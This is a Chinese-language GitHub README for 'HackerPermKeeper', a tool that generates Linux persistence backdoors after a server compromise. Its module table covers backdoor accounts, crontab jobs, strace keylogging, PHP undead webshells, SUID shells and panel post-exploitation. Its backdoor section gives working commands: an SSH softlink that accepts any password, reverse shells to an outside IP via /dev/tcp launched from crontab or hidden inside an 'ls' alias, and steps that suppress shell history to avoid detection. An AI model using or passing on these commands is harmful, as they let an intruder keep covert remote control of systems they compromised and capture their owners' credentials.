# :lock:	HackerPermKeeper  
### 黑客权限保持者

              _    _            _             _____                    _  __                         
             | |  | |          | |           |  __ \                  | |/ /                         
             | |__| | __ _  ___| | _____ _ __| |__) |__ _ __ _ __ ___ | ' / ___  ___ _ __   ___ _ __ 
             |  __  |/ _` |/ __| |/ / _ \ '__|  ___/ _ \ '__| '_ ` _ \|  < / _ \/ _ \ '_ \ / _ \ '__|
             | |  | | (_| | (__|   <  __/ |  | |  |  __/ |  | | | | | | . \  __/  __/ |_) |  __/ |   
             |_|  |_|\__,_|\___|_|\_\___|_|  |_|   \___|_|  |_| |_| |_|_|\_\___|\___| .__/ \___|_|   
                                                                                    | |              
                                                                                    |_|        
<br/>
  <p align="center">
    <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-%E5%BC%B1%E9%B8%A1-red" />
    <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%8D%9A%E5%AE%A2-www.taoyuan.cool-blue" />
    <img alt="GitHub Contributors" src="https://img.shields.io/badge/%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F-One--fox-pink" />
    <img src="https://img.shields.io/badge/WeChat-vivo50KFCKFC-black">
    <img src="https://badgen.net/github/stars/RuoJi6/HackerPermKeeper/?icon=github&color=black">
    <img src="https://badgen.net/github/issues/RuoJi6/HackerPermKeeper">
    <img src="https://img.shields.io/badge/python%E7%89%88%E6%9C%AC-3_and_2-green">
    <a href="https://flowus.cn/share/3505271f-a987-4fb1-9623-efe58dcc77ec">
     <img src="https://img.shields.io/badge/%E6%96%87%E5%BA%93-wiki-yellow">
    </a>
</p>
<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 通过渗透拿到权限之后，为了不让权限丢失，都会进行权限维持，而在进行权限维持的时候，红队需要花费大量的时候，来验证是否合适，因此在这款工具就诞生 HackerPermKeeper[黑客权限保持者] 
<br/>
【由于新版本危害较大，BT功能只供内部使用-->bt_Tools_v7.0】
<br/><br/>


## 🚀上手指南

📢 请务必花一点时间阅读此文档，有助于你快速熟悉HackerPermKeeper
<br/><br/>

<details>
<summary><b>:lock:支持系统列表</b></summary>

| :lock:权限维持模块                      | centos             | Ubuntu             | 推荐指数                                             | 需要权限     | 备注                                                         | py2                | py3                |
| :-------------------------------------- | ------------------ | ------------------ | ---------------------------------------------------- | ------------ | ------------------------------------------------------------ | ------------------ | ------------------ |
| OpenSSH后门万能密码&记录密码            | :x:                | :heavy_check_mark: | :star:                                               | root         | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x:                | :heavy_check_mark: |
| PAM后门                                 | :x:                | :x:                | :star:                                               | :x:          | 此后门需要很老的内核版本，而且需要很多依赖环境               | :x:                | :x:                |
| ssh软链接                               | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:                                     | root         | 容易被发现                                                   | :heavy_check_mark: | :heavy_check_mark: |
| ssh公私密钥                             | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:	:star:       | User         | 发现程度很难，参考了挖矿病毒                                 | :heavy_check_mark: | :heavy_check_mark: |
| 后门帐号                                | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:                           | root         | 用命令添加账户，不会创建用户home目录[有一个是直接指向root目录] | :heavy_check_mark: | :heavy_check_mark: |
| crontab计划任务                         | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:                 | User or root | 难以发现，通过执行计划任务                                   | :heavy_check_mark: | :heavy_check_mark: |
| Strace后门                              | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:                                     | root         | 键盘记录的后门                                               | :heavy_check_mark: | :heavy_check_mark: |
| Alias后门                               | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:                 | root         | 别名后门，难以发现，但是需要用户去执行命令                   | :heavy_check_mark: | :heavy_check_mark: |
| Rootkit后门[检测]                       | :x:                | :x:                | :star:	:star:	:star:                           | root         | 难以发现，但是安装复杂，而且指定内核版本                     | :x:                | :x:                |
| 临时history不记录命令 or 永久不记录命令 | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star::star::star::star:         | root         | 有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令 | :heavy_check_mark: | :heavy_check_mark: |
| ssh软链接&crontab                       | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:                 | root         | 快速生成软链接，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行 | :heavy_check_mark: | :heavy_check_mark: |
| check.py                                | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star::star::star:     | User         | 快速检测目标机器可以使用那个权限维持模块，并且检测当前机器处于docker还是k8s，并检测docker逃逸 | :heavy_check_mark: | :heavy_check_mark: |
| sshkey密钥&crontab                      | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star::star:	:star: | User or root | 快速生成ssh密钥，并且执行计划任务，每分钟判断当前密钥和多个文件是否存在，如果被kill掉，就重新执行 | :heavy_check_mark: | :heavy_check_mark: |
| php权限维持不死免杀马                   | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star::star:	:star: | User or root | phpweb权限维持马                                             | :heavy_check_mark: | :heavy_check_mark: |
| Suid shell bash                         | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:	:star:       | root         | Suid shell bash脚本(低权限用户运行),可以和webshell进行联动一个低权限用户只需要执行一个文件就可以获取高权限 | :heavy_check_mark: | :heavy_check_mark: |
| BT面板后渗透[bt_Tools_v7.0]内部版                   | :heavy_check_mark: | :heavy_check_mark: | :star:	:star:	:star:	:star:	:star:       | root         | BT面板后渗透【bt_Tools_v7.0】内部版                  | :heavy_check_mark: | :heavy_check_mark: |

![BT渗透](https://github.com/RuoJi6/HackerPermKeeper/blob/main/images/BT%E6%B8%97%E9%80%8F.png)


</details>


<details>
<summary><b>:closed_lock_with_key:权限的划分</b></summary>

| UID    | 数值                                                        | 比如：       |
| ------ | ----------------------------------------------------------- | ------------ |
| 0      | 超级管理员（root用户）                                      | root         |
| 1～999 | Linux系统将一些服务程序和系统任务分配给独立的系统用户来运行 | bin          |
| 1000   | 普通用户UID从1000开始                                       | www-data,www |

</details>

<details>
<summary><b>🐍安装要求</b></summary>
  
```
python3运行此项目[我自己的环境是Python 3.9.7]，但是运行权限维持模块脚本请看上面的表格
安装依赖
pip install -r requirements.txt
```
  
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/917d5afc-1775-4bcc-82d0-c9adb7cf89b7)

```
测试是否正常运行
python main.py -h
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/d4c4b282-6570-4b3e-ba97-d27e7eaef42b)



</details>

<details>
<summary><b>✨使用演示</b></summary>

```
查看帮助
python main.py -h
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/b2216e6b-c07c-4ee6-9768-3da79c6d9932)



```
快速判断目标机器适合的权限维持模块，运行 /check/ 目录下的check.py文件[这个不需要任何依赖环境，python3和python2都支持]
python check.py
python3 check.py
python2 check.py
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/09fd1694-c90a-49da-a9c9-47e7745463d2)




```
查看权限维持模块信息
python main.py -c 1
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/a15340cc-6586-4541-9345-55ef3a8873a8)



```
查看权限维持模详细块信息
python main.py -c 2
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/59a86236-1e03-4ea9-8b48-d14d57451317)


```
使用此项目生成权限维持脚本[在这之前，请先运行check.py脚本判断出目标机器适合什么类型权限维持的脚本]
python main.py -m 1   #选择模块[6.0更新之后，可以连续选择]
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/2cb4a5a6-76e7-4da5-8000-b8d080070914)

```
有的生成的脚本文件。需要在生成之后进行手动修改
比如：修改反弹shellip以及端口，后门用户密码，ssh密钥密码，ssh密钥等[此缺陷将会在第二个版本修复]
生成的文件会在payloads目录下产生
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/8e9c3c6e-21a3-4a14-adc3-632f08da434a)


使用视频：https://www.bilibili.com/video/BV1fV411N7Qc/
</details>

<details>
<summary><b>:triangular_flag_on_post:	常见后门介绍</b></summary>

```
OpenSSH后门万能密码&记录密码（这个需要依赖环境），就是把对方的门换个锁，但是原来的钥匙也可以使用
发现程度：||

PAM后门，PAM是一个Linux登录验证的认证服务，修改其中关于ssh登录的验证，添加一个万能密码，已经记录的账号密码位置（类似把对方房间内有内鬼）
发现程度：||


SSH软链接
cat /etc/ssh/sshd_config|grep UsePAM
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888
ssh root@xx.xx.xx.xx -p 8888 任意密码登录即可
发现程度：||||||


公私钥
使用密钥进行登录
发现程度：||||||


后门帐号
使用命令添加账号
发现程度：||||||


crontab后计划任务
1、编辑后门反弹
vim /etc/.111.sh

#!/bin/bash
sh -i >& /dev/tcp/192.168.86.137/3434 0>&1

chmod +x /etc/.111.sh

2、添加定时任务
vim /etc/crontab
*/1 * * * * root /etc/.1111.sh
发现程度：||||||


Strace后门
strace是一个动态跟踪工具，它可以跟踪系统调用的执行。
我们可以把他当成一个键盘记录的后门，来扩大我们的信息收集范围
可以记录ssh明文和密钥（登录的）和Rootkit配合一起
发现程度：||||

命令自定义-Alias后门
alias命令的功能：为命令设置别名
alias ls='alerts(){ ls $* --color=auto;bash -i >& /dev/tcp/192.168.86.137/3333 0>&1; };alerts'
执行ls就会反弹shell
持久化+隐藏：重启依旧生效
发现程度：||||

Rootkit后门
https://github.com/f0rb1dd3n/Reptile/releases/
Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。
发现程度：||
但是使用工具进行检测出来情况很大，建议看代码，手动编写此工具（难度很大）


history不记录执行命令
在输入命令时候，添加空格

ssh软链接&crontab
快速生成软链接[需要运行脚本成功后，一分钟连接]，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行

|||||  越多，越容易发发现
||        越少，越难发现，但是部署起来，需要的依赖很多

```

</details>


<details>
<summary><b>:warning:常见错误error</b></summary>

```
1、
使用ssh密钥后门连接的时候，出现这个错误，就是当前ip有在known_hosts中存在多个主机文件
解决：ssh-keygen -f "known_hosts文件" -R "目标Ip"
或者使用另外一台机器连接
```
![TON3EA2_MQW`94HRK53GZTQ](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/93dad03b-af7c-4e62-9dc8-87722504ce10)
删除成功
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/3342097e-b280-4b68-b90b-788a2de5cca6)

```
2、
下载的ssh密钥连接的时候出现安全性错误
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/76dfafe5-22a7-4698-b08e-fd5857a15641)
解决：修改权限 chmod 600 密钥文件，然后在连接
```
![image](https://github.com/RuoJi6/HackerPermKeeper/assets/79234113/8d9262ac-1555-466d-8ed7-197fb9521d43)

</details>

<details>
<summary><b>:zap:提交问题</b></summary>
有问题请提交issues<br/>
<a href="https://github.com/RuoJi6/HackerPermKeeper/issues"><img src="https://badgen.net/github/issues/RuoJi6/HackerPermKeeper"></a>
<br/>
加我微信进开发者微信群聊 
<br/><img src="https://img.shields.io/badge/WeChat-vivo50KFCKFC-green">
</details>

<br/>

## :world_map:版本更新
```
1.0 权限维持
----------------------------------------------------------------------------------------------------------
2.0 1、利用成功之后删除文件
    2、命令配合使用[软链接+计划任务]
    3、判断当前系统有没有python环境
    4、使用ssh密钥的时候，在对方服务器生成的时候，生成完成之后，删除文件id_ed25519.pub和id_ed25519
    5、设置全局环境变量不记录空格命令[history]
    6、修改在不同环境下，main.py运行bug
    7、修复计划任务，在反弹shell的时候，出现的python版本问题
    8、ssh密钥权限维持模块，bug修复，如果是出现不是root，权限也可以成功
    9、修复check.py脚本检测普通用户权限
----------------------------------------------------------------------------------------------------------
3.0 1、php web权限维持马[首页马，加密马内存马，不死马]
    2、模块配合使用[添加用户加计划任务，ssh密钥加计划任务]
    3、在计划任务配合使用的时候，发现还需要判断文件有没有加锁
----------------------------------------------------------------------------------------------------------
4.0 1、修改ssh密钥以及添加用户中重新运行时候，检测是否加锁解锁操作
----------------------------------------------------------------------------------------------------------
5.0 1、检测docker，k8s环境
    2、检测docker逃逸，特权逃逸，Docker Socket逃逸，docker procfs逃逸[以后会添加针对k8s横向以及逃逸]
    3、别名权限维持文件不存在bug修复
    4、修复检测脚本bug
----------------------------------------------------------------------------------------------------------
6.0 1、Suid shell bash权限维持
    2、重写生成代码(连续生成)
    3、添加不记录历史命令临时操作，同时可以批量删除指定的.bash_history文件中的历史记录
    4、修改检查脚本(添加检查环境)
    5、使用tabulate模块进行格式化输出
```


<br/>

## :beginner:开发日志
<a href="https://flowus.cn/ruoji/share/57079f81-d391-478e-88c8-329c93371723">点击跳转</a>

<br/>

## :star2:Stargazers over time [![Stargazers over time](https://starchart.cc/RuoJi6/HackerPermKeeper.svg)](https://starchart.cc/RuoJi6/HackerPermKeeper)


## Stargazers

[![Stargazers repo roster for @RuoJi6/HackerPermKeeper](http://reporoster.com/stars/RuoJi6/HackerPermKeeper)](https://github.com/RuoJi6/HackerPermKeeper/stargazers)


## Forkers

[![Forkers repo roster for @RuoJi6/HackerPermKeeper](http://reporoster.com/forks/RuoJi6/HackerPermKeeper)](https://github.com/RuoJi6/HackerPermKeeper/network/members)


<a href="https://github.com/RuoJi6">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api?username=RuoJi6"/>
</a>
<a href="https://github.com/RuoJi6/HackerPermKeeper/">
  <img height=150 align="center" src="https://github-readme-stats.vercel.app/api/top-langs?username=RuoJi6&layout=compact&langs_count=8&card_width=320" />
</a>

